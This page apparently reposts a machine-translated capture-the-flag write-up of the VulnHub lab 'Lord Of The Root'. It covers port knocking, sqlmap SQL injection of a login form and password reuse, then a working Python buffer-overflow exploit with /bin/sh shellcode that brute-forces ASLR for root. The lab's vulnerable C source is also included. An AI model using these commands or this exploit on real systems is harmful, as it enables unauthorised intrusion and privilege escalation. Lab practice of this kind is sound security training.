<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>VulnHub: Exploiting the buffer overflow vulnerability in Lord Of The Root</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="We continue the analysis of quests with VulnHub , this time I got quite interesting with a round of ASLR: Lord Of The Root . But first things first......">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>VulnHub: Exploiting the buffer overflow vulnerability in Lord Of The Root</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/444/c9b/a38/444c9ba38e9840538347246124d2d54f.png"><br><br>  We continue the analysis of quests with <a href="https://www.vulnhub.com/">VulnHub</a> , this time I got quite interesting with a round of ASLR: <a href="https://www.vulnhub.com/entry/lord-of-the-root-1,129/">Lord Of The Root</a> .  But first things first... <a name="habracut"></a><br><br>  We start virtualka with image: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <div style="text-align:center;"><img src="https://habrastorage.org/files/f52/e39/51c/f52e3951c7684e489c6b3123e87f76a4.png"></div><br>  Already interesting.  In this lab, we were given a graphical interface, and gave the first lead, in the form of a user login: <i>smeagol</i> . <br><br>  But let's leave authorization for now, and move on to exploring open ports: <br><br><pre><code class="bash hljs">$ sudo arp-scan -l | grep <span class="hljs-string"><span class="hljs-string">"CADMUS COMPUTER SYSTEMS"</span></span> | awk <span class="hljs-string"><span class="hljs-string">'{print $1}'</span></span> | xargs sudo nmap -sV -p1-65535</code> </pre> <br><blockquote>  Starting Nmap 7.01 ( <a href="https://nmap.org/">nmap.org</a> ) at 2016-12-21 19:33 MSK <br>  Nmap scan report for 192.168.1.175 <br>  Host is up (0.00033s latency). <br>  Not shown: 999 filtered ports <br>  PORT STATE SERVICE VERSION <br>  22 / tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0) <br>  |  ssh-hostkey: <br>  |  1024 3c: 3d: e3: 8e: 35: f9: da: 74: 20: ef: aa: 49: 4a: 1d: ed: dd (DSA) <br>  |  2048 85: 94: 6c: 87: c9: a8: 35: 0f: 2c: db: bb: c1: 3f: 2a: 50: c1 (RSA) <br>  | _ 256 f3: cd: aa: 1d: 05: f2: 1e: 8c: 61: 87: 25: b6: f4: 34: 45: 37 (ECDSA) <br>  MAC Address: 08: 00: 27: 40: B5: B3 (Oracle VirtualBox virtual NIC) <br>  Warning: it can be unreliable; <br>  Device type: general purpose <br>  Running: Linux 3.X | 4.X <br>  OS CPE: cpe: / o: linux: linux_kernel: 3 cpe: / o: linux: linux_kernel: 4 <br>  OS details: Linux 3.10 - 3.19, Linux 3.2 - 4.0 <br>  Network Distance: 1 hop <br>  Service Info: OS: Linux;  CPE: cpe: / o: linux: linux_kernel </blockquote><br>  Only 1 port?  Seriously?  Having run <i>nmap</i> again, we are convinced that so far only ssh is available to us.  Let's try to connect: <br><br><pre> <code class="bash hljs">$ ssh smeagol@192.168.1.175</code> </pre> <br><img src="https://habrastorage.org/files/48c/c07/356/48cc07356d124210adf727d886aef7e5.png"><br>  <i>‚ÄúTap a friend to enter‚Äù</i> is a reference to Lord of the Rings.  Quickly finding that in the original <i>friend</i> is <i>mellon</i> , we try to log in. <br><br>  The attempt was unsuccessful, the brute force of logins and possible passwords on the subject also did not produce results. <br><br>  I was embarrassed by the word <i>knock</i> , already dealing with <i>port knocking</i> , I assumed that it is used here. <br><br>  Check the guess: <br><br><pre> <code class="bash hljs">$ sudo knock 192.168.1.175 1 2 3; ssh smeagol@192.168.1.175</code> </pre> <br>  Unfortunately, nothing has changed.  authorization is still required.  And what if, after the "knock" opens a port? <br><br><pre> <code class="bash hljs">$ sudo knock 192.168.1.175 1 2 3; sudo nmap 192.168.1.175 -sV -p1-65535</code> </pre> <br>  After a long time, we get the following result: <br><br><blockquote>  Starting Nmap 7.01 ( <a href="https://nmap.org/">nmap.org</a> ) at 2016-12-22 02:42 MSK <br>  Nmap scan report for 192.168.1.175 <br>  Host is up (0.00020s latency). <br>  PORT STATE SERVICE VERSION <br>  22 / tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0) <br>  1337 / tcp open http Apache httpd 2.4.7 ((Ubuntu)) <br>  MAC Address: 08: 00: 27: 39: 91: 65 (Oracle VirtualBox virtual NIC) <br>  Service Info: OS: Linux;  CPE: cpe: / o: linux: linux_kernel </blockquote><br>  <b>PS</b> Here it is worth making a reservation that in order to speed up the process, it is better to scan ports in small ranges. <br><br>  Indeed, on the "elite" port Apache is spinning, let's see what is there: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/7de/70c/292/7de70c2926984b82b2f3bd81688298e8.jpg"></div><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">img</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/images/iwilldoit.jpg"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">align</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"middle"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  Not much ... After analyzing the picture, nothing was found in it either.  Perhaps there are hidden files and directories? <br><br><pre> <code class="bash hljs">sudo dirsearch -u http://192.168.1.175:1337/ -e php,html,js,json,jpg,txt,bak -w /usr/share/dirb/wordlists/big.txt</code> </pre> <br><img src="https://habrastorage.org/files/ce8/b38/4cd/ce8b384cd9e144279bdbbc9ab7af2aed.png"><br><br>  Nothing interesting, just in case looking at <i>404.html</i> , we get another image: <br><br><img src="https://habrastorage.org/files/c96/241/cf7/c96241cf7fa54d9eaff5f12ebbf714cb.jpg"><br><br>  And here is the code: <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">img</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/images/hipster.jpg"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">align</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"middle"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt; &lt;/html&gt;</span></span></code> </pre> <br>  But this is already something!  Decode: <br><br><pre> <code class="bash hljs">$ <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh | base64 -d Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer! $ <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> Lzk3ODM0NTIxMC9pbmRleC5waHA= | base64 -d /978345210/index.php</code> </pre> <br>  Link to another starnitsu, go there: <br><br><img src="https://habrastorage.org/files/b2e/2e4/176/b2e2e41765814ec3bb411faa06f913a9.png"><br><br>  Authorization ... First of all, we check for the presence of SQL injections: <br><br><pre> <code class="bash hljs">$ sudo sqlmap -u <span class="hljs-string"><span class="hljs-string">'http://192.168.1.175:1337/978345210/index.php'</span></span> --data=<span class="hljs-string"><span class="hljs-string">'username=%22&amp;password=%22&amp;submit=+Login+'</span></span> -vv</code> </pre> <br><img src="https://habrastorage.org/files/80f/992/d82/80f992d82aec47418fb7a40c483cd8ed.png"><br><br>  We are redirected.  Having said <i>sqlmap to</i> continue searching, we check what is on the <i>profile.php</i> page.  Log in using the found <i>payload</i> . <br><br><img src="https://habrastorage.org/files/e3b/22b/99d/e3b22b99dc03466d987fe4210523bf6c.png"><br><pre> <code class="hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span>LOTR Profile<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"profile"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"welcome"</span></span></span><span class="hljs-tag">&gt;</span></span>Welcome : <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">i</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">i</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">br</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">img</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/images/legolas.jpg"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">align</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"middle"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">br</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"logout"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"logout.php"</span></span></span><span class="hljs-tag">&gt;</span></span>Log Out<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  Not finding anything interesting here, we continue to spin the injection: <br><br><pre> <code class="bash hljs">$ sudo sqlmap -u <span class="hljs-string"><span class="hljs-string">'http://10.0.31.127:1337/978345210/index.php'</span></span> --data=<span class="hljs-string"><span class="hljs-string">'username=%22&amp;password=%22&amp;submit=+Login+'</span></span> --dbms=MySQL -p username --tables --risk=3 --level=2</code> </pre> <br>  In the log sqlmap database hit: <i>Webapp</i> and the only table: <i>Users</i> .  After which dump we get the list of logins and passwords: <br><br><img src="https://habrastorage.org/files/6b0/2d2/f80/6b02d2f802e54a17baf22cf6301325d4.png"><br><br>  There is a user <i>smeagol</i> , relying on the fact that the password from the web is the same as the password from the system, we try to log in and get the desktop.  Fine! <br><br>  In the command history we see the records: <br><blockquote>  smeagol @ LordOfTheRoot: ~ $ cat .bash_history <br>  su - sudo / etc / passwod <br>  visudo <br>  smeagol @ LordOfTheRoot: ~ $ </blockquote><br>  Having opened the browser, in the history it is possible to trace all stage of creation of this lab: <br><br><img src="https://habrastorage.org/files/2e9/622/454/2e9622454dc2493f9d4ef2cf5e98f008.png"><br><br>  We also see a <a href="http://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html">link</a> to the description of the buffer overflow vulnerability. <br><br>  Further, during a cursory examination of the system, we find the folder <i>/ SECRET</i> with the following contents: <br><br><img src="https://habrastorage.org/files/3e4/fe3/618/3e4fe36180324b91896524cc7be64c77.png"><br><br>  After reading the article, we understand that one of these files has the vulnerability described there, and below we find an example of an exploit.  It remains to understand which of the files.  We download them to ourselves and open them in IDA, for gdb lovers in a virtual machine can use it. <br><br><img src="https://habrastorage.org/files/2a8/423/3f9/2a84233f9af549d9aaefa51061c22f4f.PNG"><br><br>  / SECRET / door1 / file <br><br><img src="https://habrastorage.org/files/3b7/709/ed9/3b7709ed94f54766abba7ef7f4b1f43d.PNG"><br><br>  / SECRET / door2 / file <br><br><img src="https://habrastorage.org/files/2a8/423/3f9/2a84233f9af549d9aaefa51061c22f4f.PNG"><br><br>  / SECRET / door3 / file <br><br>  And so, the file we need is behind the ‚Äúsecond door,‚Äù if you look closely, it is noticeable that the size of this file is smaller than the rest.  Copy the exploit, compile it, run it, and nothing.  We try to substitute other numbers, and nothing again. <br><br>  Having opened this file in gdb right in the virtual machine, we see that it has changed!  Oh, how ... After watching for some time, we notice that the vulnerable file constantly ‚Äúmoves‚Äù between these directories. <br><br>  Then there was a series of unsuccessful attempts to use this exploit, for all attempts I either did not receive anything in response, or it was an error "Segmentation fault" or "Illegal instruction" <br>  After much experimentation and viewing the state of the registers and the stack, before and after processing the input line, I noticed that the stack address changes everything in the range from <i>0xBF000000</i> to <i>0xBFFFFFFF</i> . <br><br>  Running the command: <br><br><pre> <code class="bash hljs">$ cat /proc/sys/kernel/randomize_va_space 2</code> </pre> <br>  Make sure the system has ASLR enabled.  There are several ways to circumvent it, they have been repeatedly written about before.  I stopped at BruteForce, because the range of memory changes is not so big, and the file is too simple to complicate things. <br><br>  We need <a href="https://github.com/longld/peda">GDB Peda</a> . <br><br>  To begin with, you need to decide on the offset at which the return address is located, and it will be necessary to rewrite it. <br><br><img src="https://habrastorage.org/files/6ef/633/5b1/6ef6335b19dc4e2cbb567214d4983747.png"><br><br>  Run our file in the debugger, passing a very long string to it as an argument <br><br><img src="https://habrastorage.org/files/5a0/d7d/ff4/5a0d7dff4c8143d196318b79de37ede2.png"><br><br>  Great, the return address (EIP) is overwritten by our value. <br><br>  Further, using the templates in <i>peda,</i> you can automatically determine the offset by which this address is located.  Create a template: <br><br><img src="https://habrastorage.org/files/aeb/459/194/aeb45919498c4c66b782973a63e8ea81.png"><br><br>  And after launch we get something like this: <br><br><img src="https://habrastorage.org/files/8cf/d2c/f89/8cfd2cf895a4440787adf83581a6e8fb.png"><br><br>  Offsets are found (I took about the average value of the stack address), you can start writing an exploit.  You can also generate a <i>shellcode there</i> in <i>peda</i> : <br><br><img src="https://habrastorage.org/files/c48/1cf/9e1/c481cf9e124e439291dd2bb8ac7a5487.png"><br><br>  However, you should immediately warn that you may have other offsets. <br><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python import struct import os def p(x): return struct.pack("&lt;L", x) shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" payload = "" payload += "A"*171 payload += p(0xbfb1c5ec) payload += "\x90"*30000 payload += shell def getFile(): output = subprocess.Popen(['find', '/SECRET/', '-type', 'f', '-size', '-7k'], stdout=subprocess.PIPE) path = output.communicate()[0] path = path.decode().strip() return path while True: os.system('%s "%s"' %(getFile(), payload)) #os.system('gdb --args %s "%s"' %(getFile(), payload))</span></span></code> </pre><br>  After starting, we get a bunch of errors, and after a while we get root access, and with it the flag: <br><br><img src="https://habrastorage.org/files/883/abe/748/883abe7489044fa5a890ca378c2bfec8.png"><br><br>  PS To whom it is interesting, this is how the source code, the file-changing script and the vulnerable program looked like.  The script switcher.py was registered in cron. <br><br><div class="spoiler">  <b class="spoiler_title">switcher.py</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python import os from random import randint targets= ["/SECRET/door1/","/SECRET/door2/","/SECRET/door3/"] for t in targets: os.system("rm "+t+"*") os.system("cp -p other "+t) os.system("cp -p "+t+"other "+t+"file") os.system("rm "+t+"other") luckyDoor = randint(0,2) t=targets[luckyDoor] os.system("rm "+t+"*") os.system("cp -p buf "+t) os.system("cp -p "+t+"buf "+t+"file") os.system("rm "+t+"buf")</span></span></code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">other.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main(int argc, char *argv[]){ char buff[150]; if(argc &lt;2){ printf("Syntax: %s &lt;input string&gt;\n", argv[0]); exit (0); } //This Program does nothing return 0; }</span></span></span></span></code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">buf.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main(int argc, char *argv[]){ char buff[159]; if(argc &lt;2){ printf("Syntax: %s &lt;input string&gt;\n", argv[0]); exit (0); } strcpy(buff, argv[1]); return 0; }</span></span></span></span></code> </pre> <br></div></div></div><p>Source: <a href="https://habr.com/ru/post/318238/">https://habr.com/ru/post/318238/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../318228/index.html">Hacking on board the aircraft</a></li>
<li><a href="../318230/index.html">Information hygiene in a country with non-free Internet</a></li>
<li><a href="../318232/index.html">What is enterprise architecture, and why was Zachman wrong?</a></li>
<li><a href="../318234/index.html">Oracle Database History ‚Äî First Commercially Successful Relational DBMS</a></li>
<li><a href="../318236/index.html">Working with C ++ tuples (std :: tuple). Functions foreach, map and call</a></li>
<li><a href="../318240/index.html">"Distribution in request" or "we get rid of search"</a></li>
<li><a href="../318242/index.html">Yii2 RESTful API for AngularJS</a></li>
<li><a href="../318244/index.html">10 new tales of lost time</a></li>
<li><a href="../318246/index.html">IBM Watson will help NASA to surf the universe</a></li>
<li><a href="../318250/index.html">McAfee ATM Security Detects Hazardous Vulnerability</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>